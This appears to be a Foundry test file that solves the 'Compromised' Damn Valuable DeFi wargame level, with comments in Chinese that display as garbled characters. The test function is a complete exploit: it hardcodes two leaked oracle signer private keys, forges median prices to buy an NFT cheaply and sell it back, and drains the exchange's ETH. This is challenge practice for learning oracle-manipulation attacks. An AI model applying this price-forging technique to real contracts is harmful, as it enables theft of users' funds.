// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";

import {Exchange} from "../../../src/Contracts/compromised/Exchange.sol";
import {TrustfulOracle} from "../../../src/Contracts/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../../src/Contracts/compromised/TrustfulOracleInitializer.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
import "forge-std/console.sol";

contract Compromised is Test {
    uint256 internal constant EXCHANGE_INITIAL_ETH_BALANCE = 9990e18;
    uint256 internal constant INITIAL_NFT_PRICE = 999e18;

    Exchange internal exchange;
    TrustfulOracle internal trustfulOracle;
    TrustfulOracleInitializer internal trustfulOracleInitializer;
    DamnValuableNFT internal damnValuableNFT;
    address payable internal attacker;

    function setUp() public {
        address[] memory sources = new address[](3);

        sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
        sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
        sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c;

        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.deal(attacker, 0.1 ether);
        vm.label(attacker, "Attacker");
        assertEq(attacker.balance, 0.1 ether); // attackerÂè™Êúâ0.1 etherÂàùÂßãËµÑÈáë,‰π∞‰∏çËµ∑‰ªª‰Ωï‰∏Ä‰∏™NFT

        // Initialize balance of the trusted source addresses
        uint256 arrLen = sources.length;
        for (uint8 i = 0; i < arrLen; ) {
            vm.deal(sources[i], 2 ether); // ÊØè‰∏™Êä•‰ª∑ËÄÖÂú∞ÂùÄÁöÑÂàùÂßãËµÑÈáëÊòØ2 ether
            assertEq(sources[i].balance, 2 ether);
            unchecked {
                ++i;
            }
        }

        string[] memory symbols = new string[](3);
        for (uint8 i = 0; i < arrLen; ) {
            symbols[i] = "DVNFT"; // ÊØè‰∏™symbolÈÉΩËÆæÁΩÆÊàêDVNFT
            unchecked {
                ++i;
            }
        }

        uint256[] memory initialPrices = new uint256[](3);
        for (uint8 i = 0; i < arrLen; ) {
            initialPrices[i] = INITIAL_NFT_PRICE; // ËØ•NFTÂêàÁ∫¶ÁöÑÊØè‰∏Ä‰∏™NFTÂàùÂßã‰ª∑Ê†ºÈÉΩÊòØ999 ether
            unchecked {
                ++i;
            }
        }

        // Deploy the oracle and setup the trusted sources with initial prices
        trustfulOracle = new TrustfulOracleInitializer(
            sources,
            symbols,
            initialPrices
        ).oracle();
        // trustfulOracleÊòØÈ¢ÑË®ÄÊú∫ÂÆû‰æã,ÂàùÂßãÂåñ‰∫ÜÊä•‰ª∑ËÄÖÂú∞ÂùÄ,NFTÁöÑsymbol,‰ª•ÂèäÂàùÂßã‰ª∑Ê†º
        // Ëøô‰∏â‰∏™Âú∞ÂùÄÂØπNFTÁöÑÂàùÂßãÊä•‰ª∑ÈÉΩÊòØ999ether

        // Deploy the exchange and get the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
            address(trustfulOracle)
        );
        
        damnValuableNFT = exchange.token();

        console.log(unicode"üß® PREPARED TO BREAK THINGS üß®");
    }

    // Âè™Áªô‰∫ÜÂàùÂßãÊä•‰ª∑. Âπ∂‰∏îÁî±‰∫éÁ¨¶Âè∑ÊòØÁõ∏ÂêåÁöÑDVNFT,ÊâÄ‰ª•ÊâÄÊúâÁî±DVNFTÂêàÁ∫¶ mintÂá∫Êù•ÁöÑNFTÈÉΩÊòØ‰∏Ä‰∏™‰ª∑Ê†º
    // ÊØèÊ¨°buyOneË¢´Ë∞ÉÁî®ÁöÑÊó∂ÂÄô,NFTÂêàÁ∫¶ÈÉΩ‰ªéÈ¢ÑË®ÄÊú∫ÈáåÈÄöËøágetMedianPriceÊãøÊúÄÊñ∞ÁöÑ‰ª∑Ê†ºÊï∞ÊçÆ‰ª•Á°ÆÂÆöËøôÁ¨î‰π∞ÂçñËÉΩÂê¶ËøõË°å
    // ÊØèÊ¨°sellOneË∞ÉÁî®ÁöÑÊó∂ÂÄô,NFTÂêàÁ∫¶ÈÉΩ‰ªéÈ¢ÑË®ÄÊú∫ÈáåÈÄöËøágetMedianPriceÊãøÊúÄÊñ∞ÁöÑ‰ª∑Ê†ºÊï∞ÊçÆÂπ∂ÁªôÂéüNFTÊâÄÊúâËÄÖÊâìÈí±Âπ∂ÈîÄÊØÅËØ•NFT
    // Ê≥®ÊÑè‰∏Ä‰ª∂‰∫ã,EXCHANGE‰∏≠ÁöÑÂàùÂßãËµÑÈáëÊòØ9990 ether,ÊòØ999 etherÁöÑ10ÂÄç,ËøôÂÖ∂‰∏≠ÊòØ‰∏çÊòØÊúâ‰ªÄ‰πàÂÖ≥Á≥ªÂë¢?
    function testExploit() public {
        // base64(ascii(hex string)),ÊúÄÁªàÂæóÂà∞ÁßÅÈí•
        uint256 source1priKey=0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9;
        uint256 source2priKey=0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48;
        
        // Êúâ‰∫ÜÁ¨¨‰∫å‰∏™ÂíåÁ¨¨‰∏â‰∏™Êä•‰ª∑Ë¥¶Êà∑ÁöÑÁßÅÈí•,Áé∞Âú®Âè™ÈúÄË¶ÅÂú®Âêå‰∏ÄÁ¨î‰∫§Êòì‰∏≠‰º™ÈÄ†Êä•‰ª∑Âç≥ÂèØ
        // Á¨¨‰∏Ä‰∏™Êä•‰ª∑Ë¥¶Êà∑ÊòØÊó†Ê≥ïË¢´Âà©Áî®ÁöÑ,ÂÆÉÁöÑÊä•‰ª∑ÂßãÁªàÊòØ999,Âõ†Ê≠§Êàë‰ª¨‰º™ÈÄ†‰∏Ä‰∏™0.01Âíå0.1ÁöÑÊä•‰ª∑,ËøôÊ†∑ÂèØ‰ª•mintÂà∞ÊâãÈáå‰∏Ä‰∏™NFT
        // ÁÑ∂ÂêéÂçñÁªôExchange,ÂΩìÁÑ∂Ë¶ÅÈ¶ñÂÖà‰º™ÈÄ†9990.01ÁöÑ‰ª∑Ê†º,Âç≥Êä•‰ª∑Ë¥¶Êà∑‰∏Ä‰∏™Êä•‰ª∑100000,‰∏Ä‰∏™Êä•‰ª∑9990.1
        // ËøôÊ†∑NFTË¢´ÂçñÂá∫,ExchangeË¢´ÊéèÁ©∫
        // ÊúÄÂêéÂÜç‰º™ÈÄ†‰∏Ä‰∏™999ÁöÑÊä•‰ª∑Âç≥ÂèØ
        /** EXPLOIT START **/
        address source1Address=vm.addr(source1priKey);
        address source2Address=vm.addr(source2priKey);

        vm.prank(source1Address);
        trustfulOracle.postPrice("DVNFT",0.01 ether);

        vm.prank(source2Address);
        trustfulOracle.postPrice("DVNFT",0.1 ether);

        ERC721Receiver re=new ERC721Receiver();

        vm.etch(attacker,address(re).code);
        vm.prank(attacker);
        uint256 id=exchange.buyOne{value:0.1 ether}();
        assertEq(damnValuableNFT.balanceOf(attacker),1);
        
        // ‰º™ÈÄ†È´òÊòÇÊä•‰ª∑
        vm.prank(source1Address);
        trustfulOracle.postPrice("DVNFT",100000 ether);

        vm.prank(source2Address);
        trustfulOracle.postPrice("DVNFT",9990.1 ether);

        assertEq(9990.1 ether,trustfulOracle.getMedianPrice("DVNFT") );

        // ÂçñÂá∫NFT
        vm.startPrank(attacker);
        damnValuableNFT.approve(address(exchange),id);
        exchange.sellOne(id);
        vm.stopPrank();
        
        // ‰øÆÊîπÊä•‰ª∑
        vm.prank(source1Address);
        trustfulOracle.postPrice("DVNFT",999 ether);

        vm.prank(source2Address);
        trustfulOracle.postPrice("DVNFT",999 ether);

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Exchange must have lost all ETH
        assertEq(address(exchange).balance, 0);

        // Attacker's ETH balance must have significantly increased
        assertGt(attacker.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Attacker must not own any NFT
        assertEq(damnValuableNFT.balanceOf(attacker), 0);

        // NFT price shouldn't have changed
        assertEq(trustfulOracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}

contract ERC721Receiver {
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external virtual returns (bytes4) {
        return 0x150b7a02;
    }
    fallback() external payable{}
}
